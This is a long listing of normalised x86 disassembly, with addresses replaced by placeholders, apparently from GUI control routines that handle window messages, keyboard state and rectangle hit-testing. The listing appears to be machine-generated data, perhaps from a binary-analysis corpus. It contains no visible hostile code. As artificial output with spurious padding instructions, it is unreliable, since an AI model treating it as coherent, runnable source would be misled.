ja r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x250 ] 0x0
je r-xdata
cmp eax 0xb00b
jne r-xdata
cmp eax 0x20a
ja r-xdata
mov eax esi
call sub_45a2f0
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov ecx ebx
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x250 ]
mov edx esi
mov edi [ eax ]
call [ edi + 0x24 ]
test al al
jne r-xdata
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x14 ]
mov edx [ ebx + 0x8 ]
push edx
mov ecx [ ebx + 0x4 ]
mov edx eax
mov eax esi
call sub_4420f0
test [ esi + 0x50 ] 0x80
jne r-xdata
mov ecx ebx
mov edx esi
mov eax [ ebp - 0x14 ]
mov edi [ eax ]
call [ edi + 0xf0 ]
test al al
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx ]
sub eax 0x200
je r-xdata
sub eax 0x203
je r-xdata
jmp r-xdata
mov ecx ebx
mov eax [ rw-data ]
mov eax [ eax ]
mov edx esi
call sub_463c24
jmp r-xdata
dec eax
je r-xdata
sub [ ebx ] 0x2
sub eax 0x3
je r-xdata
cmp [ esi + 0x5d ] 0x1
jne r-xdata
dec eax
je r-xdata
sub eax 0x3
jne r-xdata
or [ esi + 0x54 ] 0x1
jmp r-xdata
mov eax esi
mov si 0xffed
call sub_403540
jmp r-xdata
and [ esi + 0x54 ] 0xfffe
jmp r-xdata
dec eax
je r-xdata
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax [ ebx ]
mov edx [ rw-data ]
cmp eax [ edx + 0x1c ]
jne r-xdata
lea eax [ ebp - 0x114 ]
push eax
call GetKeyboardState
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x114 ]
call sub_45a234
mov [ ebp - 0xc ] al
mov ax [ ebx + 0x4 ]
mov [ ebp - 0xa ] ax
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x10 ]
mov eax esi
mov si 0xffc9
call sub_403540
jmp r-xdata
sub_4439b0
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov eax [ ebx ]
sub eax 0xc
je r-xdata
mov eax [ ebx + 0x8 ]
call sub_408bd8
mov edi eax
mov eax [ esi + 0x64 ]
call sub_408c04
mov [ esi + 0x64 ] edi
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx [ ebx ]
mov eax esi
call sub_4420f0
dec eax
je r-xdata
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
dec eax
je r-xdata
mov edi r-xdata
mov edi eax
jmp r-xdata
mov edi [ esi + 0x64 ]
test edi edi
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx [ ebx + 0x4 ]
dec ecx
mov eax [ ebx + 0x8 ]
mov edx edi
call sub_408a1c
call sub_40898c
mov [ ebx + 0xc ] eax
jmp r-xdata
mov eax edi
call sub_40898c
mov [ ebx + 0xc ] eax
jmp r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
jmp r-xdata
sub_443a58
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x20 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov al [ eax + 0x5e ]
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov al [ eax + 0x5e ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp al [ edx + 0x5e ]
setne al
pop ebp
retn
sub_443a88
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
push sub_443a4c
push ebp
call sub_443a58
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_443ad8
push ebx
mov ebx eax
cmp [ ebx + 0x122 ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
cmp [ ebx + 0x122 ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov eax [ eax + 0x40 ]
cmp eax [ ebx + 0x120 ]
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
mov edx ebx
mov eax [ ebx + 0x6c ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
pop ebx
retn
sub_443b64
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
cmp [ eax + 0xd2 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x8
mov cl [ ebp - 0x1 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
sub_443b9c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi + 0x51 ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
cmp [ edi + 0x48 ] 0x8000
jg r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_44361c
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov ax [ esi + 0x4 ]
call sub_45a1a4
mov ecx eax
or cl [ ebp + 0x8 ]
mov edx ebx
mov eax edi
mov si 0xffd5
call sub_403540
jmp r-xdata
cmp [ edi + 0x4c ] 0x8000
jle r-xdata
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_45a1a4
mov ecx eax
or cl [ ebp + 0x8 ]
mov edx ebx
mov eax edi
mov si 0xffd5
call sub_403540
sub_443c20
push ebx
push esi
mov esi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_4420c0
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x50 ] 0x8
je r-xdata
mov dl 0x1
mov eax ebx
call sub_442788
mov al [ r-xdata ]
push eax
mov edx esi
xor ecx ecx
mov eax ebx
call sub_443b9c
pop esi
pop ebx
retn
or [ ebx + 0x54 ] 0x2
sub_443c6c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_4420c0
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_443c88
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_4420c0
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x50 ] 0x8
je r-xdata
mov dl 0x1
mov eax ebx
call sub_442788
mov al [ r-xdata ]
push eax
mov edx edi
xor ecx ecx
mov eax ebx
call sub_443b9c
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffe9
call sub_403540
sub_443ce0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebp ecx
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ edi ]
mov [ esp ] eax
mov eax [ ebp ]
mov [ esp + 0x4 ] eax
lea ecx [ esp + 0x4 ]
mov edx esp
mov eax esi
call sub_4435bc
test al al
je r-xdata
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
cmp [ esi + 0x5c ] 0x0
je r-xdata
mov bl 0x1
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
call sub_443550
test al al
je r-xdata
mov eax [ esp + 0x8 ]
mov [ edi ] eax
mov eax [ esp + 0xc ]
mov [ ebp ] eax
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
call sub_4435bc
test al al
jne r-xdata
mov eax [ esp + 0x8 ]
cmp eax [ esp ]
jne r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ esp + 0xc ]
cmp eax [ esp + 0x4 ]
je r-xdata
test bl bl
je r-xdata
sub_443d7c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x1
mov eax ebx
call sub_443b9c
pop esi
pop ebx
retn
sub_443da1
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x1
mov eax ebx
call sub_443b9c
pop esi
pop ebx
retn
sub_443dc7
add [ eax ] al
add [ eax ] al
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x2
mov eax ebx
call sub_443b9c
pop esi
pop ebx
retn
sub_443df1
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x2
mov eax ebx
call sub_443b9c
pop esi
pop ebx
retn
sub_443e1c
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] dl
cmp [ eax + 0xda ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x4
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov ebx eax
mov edx eax
mov cl [ ebp - 0x1 ]
mov eax [ ebx + 0xdc ]
call [ ebx + 0xd8 ]
sub_443e4c
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x51 ] 0x10
jne r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x48 ] 0x8000
jg r-xdata
mov edx esp
mov eax ebx
call sub_44361c
mov eax [ esp + 0x4 ]
push eax
mov ax [ esi + 0x4 ]
call sub_45a1a4
mov edx eax
mov ecx [ esp + 0x4 ]
mov eax ebx
mov si 0xffd4
call sub_403540
jmp r-xdata
cmp [ ebx + 0x4c ] 0x8000
jle r-xdata
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_45a1a4
mov edx eax
movsx ecx [ esi + 0x8 ]
mov eax ebx
mov si 0xffd4
call sub_403540
sub_443ec4
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
cmp [ eax + 0xe2 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x8
mov cl [ ebp - 0x1 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xe4 ]
call [ ebx + 0xe0 ]
sub_443efc
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi + 0x51 ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
retn
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_45a1a4
mov ecx eax
mov edx ebx
mov eax edi
mov si 0xffd3
call sub_403540
sub_443f34
push ebx
push esi
push edi
add esp 0xffffffe8
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x54 ] 0x2
je r-xdata
xor edx edx
mov eax ebx
call sub_442788
mov edx edi
xor ecx ecx
mov eax ebx
call sub_443efc
add esp 0x18
pop edi
pop esi
pop ebx
retn
and [ ebx + 0x54 ] 0xfffd
mov edx esp
mov eax [ edi + 0x8 ]
call sub_406c90
push [ esp + 0x4 ]
push [ esp + 0x4 ]
lea edx [ esp + 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x10 ]
push eax
call PtInRect
test eax eax
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_403540
sub_443fac
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
mov cl 0x1
mov eax ebx
call sub_443efc
pop esi
pop ebx
retn
sub_443fcc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
mov cl 0x2
mov eax ebx
call sub_443efc
pop esi
pop ebx
retn
sub_443fec
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax [ rw-data ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov ax [ ebx + 0x4 ]
call sub_45a1a4
mov [ ebx + 0x4 ] al
mov edx ebx
mov eax edi
mov si 0xffc9
call sub_403540
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x20 ] 0x1
mov edx 0x68
mov eax [ rw-data ]
call sub_44d740
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_444044
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_442778
test al al
je r-xdata
and [ esi + 0x54 ] 0xfffe
xor edx edx
mov eax esi
call sub_442788
test [ esi + 0x54 ] 0x1
je r-xdata
pop esi
retn
push 0xffffffff
xor ecx ecx
mov edx 0x202
mov eax esi
call sub_443750
pop esi
retn
sub_444084
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x74 ]
mov edx [ eax + 0xc ]
test edx edx
jbe r-xdata
mov edx [ eax + 0x14 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x48 ]
jge r-xdata
mov edx [ eax + 0x8 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x48 ]
jle r-xdata
mov edx [ ebx + 0x48 ]
mov [ eax + 0xc ] edx
jmp r-xdata
mov edx [ eax + 0x10 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x4c ]
jge r-xdata
mov edx [ ebx + 0x48 ]
mov [ eax + 0x14 ] edx
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
cmp edx [ ebx + 0x4c ]
jle r-xdata
mov edx [ ebx + 0x4c ]
mov [ eax + 0x8 ] edx
jmp r-xdata
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov edx [ ebx + 0x4c ]
mov [ eax + 0x10 ] edx
test [ ebx + 0x55 ] 0x4
jne r-xdata
test [ eax + 0x18 ] 0x1
jne r-xdata
cmp [ eax + 0x10 ] 0x0
je r-xdata
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov eax ebx
call sub_443784
sub_444132
add [ eax ] al
test [ eax + 0x1c ] 0x10
je r-xdata
cmp [ eax + 0x57 ] 0x0
je r-xdata
test [ eax + 0x51 ] 0x4
je r-xdata
xor ecx ecx
jmp r-xdata
test [ eax + 0x50 ] 0x40
jne r-xdata
retn
mov dl 0x1
call sub_442998
mov cl 0x1
sub_444174
push ebx
mov ebx eax
cmp [ ebx + 0x5a ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x70 ]
mov eax ebx
call sub_4426f0
mov edx [ edx + 0x8 ]
mov eax ebx
call sub_4426f0
jmp r-xdata
mov [ ebx + 0x5a ] 0x1
sub_4441a4
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x60 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
mov [ ebx + 0x60 ] 0x1
mov dl [ esi + 0x5f ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x70 ]
sub_4441c8
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx edx
mov edi eax
xor eax eax
mov [ ebx + 0xc ] eax
mov edx esp
mov eax [ ebx + 0x8 ]
call sub_406c90
push esp
movsx ecx [ ebx + 0x6 ]
mov dl [ ebx + 0x4 ]
mov eax edi
mov si 0xffe2
call sub_403540
test al al
je r-xdata
mov esi [ edi + 0x30 ]
test esi esi
je r-xdata
mov [ ebx + 0xc ] 0x1
jmp r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx 0xb043
mov eax esi
call sub_443750
mov [ ebx + 0xc ] eax
sub_44426c
push ebx
mov ebx eax
cmp [ ebx + 0x59 ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x68 ]
mov eax ebx
call sub_442644
mov edx [ edx + 0x8 ]
mov eax ebx
call sub_442644
jmp r-xdata
mov [ ebx + 0x59 ] 0x1
sub_444300
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
xor esi esi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
test eax eax
je r-xdata
mov eax esi
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov edi eax
mov eax ebx
call sub_40328c
cmp edi eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov dl 0x1
call [ eax + 0x2c ]
mov esi eax
mov edx [ esp + 0x4 ]
mov eax esi
call sub_441ce4
mov edx [ esp ]
mov eax esi
call sub_441cc0
mov edx [ esp + 0x8 ]
sub edx [ esp ]
mov eax esi
call sub_441f6c
mov edx [ esp + 0xc ]
sub edx [ esp + 0x4 ]
mov eax esi
call sub_441fb0
sub_444384
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
lea ecx [ ebp - 0x10 ]
mov eax [ edi ]
mov edx [ eax + 0x44 ]
mov eax [ edi ]
mov eax [ eax + 0x40 ]
call sub_412edc
lea edx [ ebp - 0x10 ]
lea ecx [ ebp - 0x8 ]
mov eax [ edi ]
mov eax [ eax + 0x30 ]
call sub_442068
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
lea ebx [ eax + 0x44 ]
mov eax [ ebx + 0xc ]
sub eax [ ebx + 0x4 ]
mov edx [ edi ]
mov esi [ edx + 0x30 ]
add eax [ esi + 0x4c ]
mov edx [ edi ]
sub eax [ edx + 0x4c ]
push eax
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebx + 0x8 ]
sub ecx [ ebx ]
add ecx [ esi + 0x48 ]
mov eax [ edi ]
sub ecx [ eax + 0x48 ]
mov edx [ esi + 0x44 ]
add edx [ ebx + 0x4 ]
sub edx [ ebp - 0x4 ]
mov eax [ esi + 0x40 ]
add eax [ ebx ]
sub eax [ ebp - 0x8 ]
call sub_412f2c
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_441f10
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_444410
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
lea edx [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
call sub_444300
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ eax + 0x4 ] ebx
mov eax ebx
call sub_448d84
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x8 ]
mov [ edx + 0x8 ] eax
push ebp
call sub_444384
pop ecx
jmp r-xdata
sub_444470
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_44455e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_444565
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_4040b8
retn
test bl bl
je r-xdata
mov edx [ edi + 0x64 ]
mov eax esi
call sub_442580
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_442550
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov dl [ edi + 0x6a ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
cmp al 0x1
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_442550
mov eax [ ebp - 0x8 ]
mov edx [ esi + 0x8 ]
call sub_4044a0
jne r-xdata
lea eax [ esi + 0x80 ]
mov edx [ edi + 0x7c ]
call sub_4040e8
cmp [ esi + 0x80 ] 0x0
jne r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x86 ]
mov eax esi
call sub_442470
cmp [ esi + 0x57 ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x40 ]
mov [ esi + 0x120 ] eax
mov eax [ edi + 0x44 ]
mov [ esi + 0x124 ] eax
cmp [ esi + 0x122 ] 0x0
jne r-xdata
test bl bl
je r-xdata
sub_44456c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
cmp esi eax
jne r-xdata
pop esi
pop ebx
retn
xor ecx ecx
mov edx esi
mov eax ebx
mov si 0xffef
call sub_403540
sub_444598
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_4445b8
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_4445d8
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_4445f8
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_444618
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_444638
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_444658
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_41a200
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
mov eax ebx
call sub_441ba4
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx eax
mov cl 0x1
mov eax ebx
mov si 0xffef
call sub_403540
sub_444690
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_44472c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_414a98
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
mov edx eax
mov edi esi
mov eax edi
call sub_44ef30
mov edx [ ebx + 0x80 ]
mov eax edi
call sub_44f068
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_442550
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_44edc8
mov dl [ ebx + 0x57 ]
mov eax edi
call sub_44f188
push [ ebx + 0x124 ]
push [ ebx + 0x120 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_444733
lea eax [ ebp - 0x4 ]
call sub_404094
retn
sub_44473c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
xor ebx ebx
mov ecx edx
test ecx ecx
jle r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
mov esi 0x1
mov edx [ ebp - 0x4 ]
add edx 0x8
inc esi
add edx 0x8
dec ecx
jne r-xdata
mov ebx esi
fld [ edx ]
mov eax [ ebp - 0x4 ]
fcomp [ eax + ebx * 8 ]
fnstsw ax
sahf
jae r-xdata
sub_444778
push ebx
push esi
push edi
push ebp
add esp 0xffffffc8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor ebx ebx
mov esi [ eax + 0x48 ]
mov edi [ eax + 0x4c ]
mov eax [ esp ]
test eax eax
jg r-xdata
cmp esi eax
jg r-xdata
mov bl 0x3
jmp r-xdata
mov edx [ esp + 0x4 ]
test edx edx
jg r-xdata
mov bl 0x4
jmp r-xdata
mov eax ebx
add esp 0x38
pop ebp
pop edi
pop esi
pop ebx
retn
cmp edi edx
jg r-xdata
mov bl 0x1
jmp r-xdata
mov ebp edx
sub edi edx
mov [ esp + 0x8 ] eax
sub esi eax
fild [ esp + 0x8 ]
fstp [ esp + 0xc ]
fwait
mov [ esp + 0x2c ] esi
fild [ esp + 0x2c ]
fstp [ esp + 0x14 ]
fwait
mov [ esp + 0x30 ] ebp
fild [ esp + 0x30 ]
fstp [ esp + 0x1c ]
fwait
mov [ esp + 0x34 ] edi
fild [ esp + 0x34 ]
fstp [ esp + 0x24 ]
fwait
lea eax [ esp + 0xc ]
mov edx 0x3
call sub_44473c
sub eax 0x1
jb r-xdata
mov bl 0x2
jmp r-xdata
mov bl 0x3
jmp r-xdata
je r-xdata
mov bl 0x4
jmp r-xdata
dec eax
je r-xdata
mov bl 0x1
jmp r-xdata
dec eax
je r-xdata
mov bl 0x2
jmp r-xdata
sub_444828
push ebx
mov ebx eax
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov edx eax
mov eax [ ebx + 0xa0 ]
call sub_4034d0
test al al
jne r-xdata
mov al 0x1
pop ebx
retn
sub_44485c
push ebx
test [ eax + 0x1c ] 0x1
jne r-xdata
pop ebx
retn
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x4c ]
push edx
mov ecx [ eax + 0x44 ]
mov edx [ eax + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
sub_44487c
push ebx
push esi
push edi
mov edi eax
mov ebx edx
mov eax edi
mov si 0xffc8
call sub_403540
test al al
je r-xdata
mov eax edi
call sub_4448bc
or ebx eax
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax ebx
and eax 0x2
cmp eax 0x2
jne r-xdata
mov eax ebx
and eax 0x1
dec eax
je r-xdata
and ebx 0xfffffffd
jmp r-xdata
or ebx 0x2
sub_4448e8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x8 ]
lea edx [ eax + 0x38 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x78 ]
test al al
jne r-xdata
mov [ edi + 0xc ] 0x1
sub_444914
push ebx
push esi
push edi
push ebp
add esp 0xffffffd4
